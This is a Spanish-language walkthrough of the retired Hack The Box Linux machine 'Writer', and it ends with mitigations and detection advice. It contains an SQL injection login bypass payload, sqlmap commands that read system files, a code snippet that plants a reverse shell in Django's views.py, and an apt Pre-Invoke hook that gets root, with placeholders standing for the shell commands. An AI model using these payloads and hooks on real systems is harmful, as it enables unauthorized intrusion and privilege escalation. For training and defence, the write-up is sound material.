---
machine: Writer
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, sqli, auth-bypass, file-read, ssrf, samba, django, postfix, apt, privesc]
---

# Writer — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El panel `/administrative` es vulnerable a SQLi: `admin' or 1=1-- -` evita el login y una inyección UNION con privilegio `FILE` lee archivos del sistema. El código fuente y `/etc/samba/smb.conf` revelan credenciales de la base de datos y el share `writer2_project`, accesible por SMB con el usuario `kyle`. El share es escribible y contiene el proyecto Django que se sirve en el puerto interno `8080`. Se modifica `views.py` para ejecutar una reverse shell y se activa con el SSRF del formulario de historias. La shell es `www-data`. El hash de Django se crackea para pasar a `kyle`; su grupo `filter` permite escribir el filtro de Postfix, que se ejecuta como `john`, y el grupo `management` da escritura en `/etc/apt/apt.conf.d`, donde un `Pre-Invoke` se ejecuta como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,139,445 <IP>
```

- `22`: OpenSSH.
- `80`: nginx con la aplicación.
- `139`/`445`: Samba.

```bash
echo '<IP> writer.htb' | sudo tee -a /etc/hosts
```

## Enumeración

El panel `/administrative` y el formulario de historias son los puntos de entrada. Samba publica `writer2_project`, y el código del proyecto se sirve en el puerto interno `8080`.

## Foothold

El login de `/administrative` concatena los campos en la consulta. El bypass es directo:

```text
uname=admin' or 1=1-- -&password=x
```

Ya en el panel, el formulario de historias permite cargar una imagen desde una URL. Es un SSRF. La misma SQLi, con el usuario de base de datos que tiene `FILE`, permite leer archivos:

```bash
sqlmap -r login.req --file-read=/etc/passwd
sqlmap -r login.req --file-read=/etc/samba/smb.conf
```

El código del proyecto incluye credenciales de la base de datos; la contraseña se reutiliza para `kyle` en SMB. El share `writer2_project` es escribible.

## Movimiento lateral

El share contiene el proyecto Django que se ejecuta en el puerto interno `8080`. Se modifica `views.py` para ejecutar un comando:

```python
import os
def home_page(request):
    os.system('<REVERSE_SHELL>')
```

Se sube por SMB y se activa con el SSRF; la URL debe contener `.jpg` para pasar el filtro:

```text
http://127.0.0.1:8080/?.jpg
```

La shell es `www-data`. En la base de datos de Django hay un hash; tras crackearlo se obtiene la contraseña de `kyle`.

## Escalada de privilegios

`kyle` está en los grupos `filter` y `smbgroup`, y puede escribir `/etc/postfix/disclaimer`. Postfix ejecuta ese script como `john` para cada correo; se añade una clave SSH, se envía un correo a `localhost:25` y se obtiene `john`. El script se restaura cada minuto, así que hay que escribirlo y enviar el correo de inmediato.

```bash
ssh -L 25:127.0.0.1:25 kyle@writer.htb
swaks --to irc@writer.htb --from kyle@writer.htb --server 127.0.0.1 --body test
```

`john` pertenece al grupo `management`, que puede escribir en `/etc/apt/apt.conf.d`.

Para root se aprovecha `apt`. Se crea un archivo de configuración con un `Pre-Invoke`:

```text
apt::Update::Pre-Invoke { "<REVERSE_SHELL>"; };
```

El cron de actualización ejecuta `apt-get update` como root, dispara el `Pre-Invoke` y devuelve una shell de root.

## Evidencia

- Bypass de login con `admin' or 1=1-- -`.
- Lectura de archivos con SQLi y credenciales de Samba.
- Acceso a `writer2_project`, edición de `views.py` y SSRF.
- Shell como `www-data` y hash de Django crackeado.
- Filtro de Postfix como `john` y `apt.conf.d` escribible.
- `Pre-Invoke` ejecutado por el cron de apt como root.

## Lecciones aprendidas

- Una SQLi en el login puede combinarse con `FILE` para leer el sistema.
- Las credenciales de la aplicación se reutilizan en SMB y en el sistema.
- Un share escribible con código servido por la aplicación es RCE.
- Los filtros de correo ejecutan scripts con la cuenta configurada.
- Un grupo con escritura en `apt.conf.d` permite ejecución como root.
- El SSRF se activa con una ruta que cumpla el filtro de extensión.

## Mitigaciones y detección

- Parametrizar consultas y limitar el privilegio `FILE` del usuario de base de datos.
- No reutilizar contraseñas entre aplicación, SMB y sistema.
- Sacar el código de directores compartidos y restringir la escritura SMB.
- Revisar los filtros de Postfix y ejecutarlos con mínimos privilegios.
- Restringir la escritura en `/etc/apt/apt.conf.d` y revisar `Pre-Invoke`.
- Monitorizar ediciones de `views.py`, correos al filtro y ejecuciones de `apt-get update`.

## Referencias

- [0xdf — Writer](https://0xdf.gitlab.io/2021/12/11/htb-writer.html)
- [Hack The Box — Writer](https://app.hackthebox.com/machines/writer)
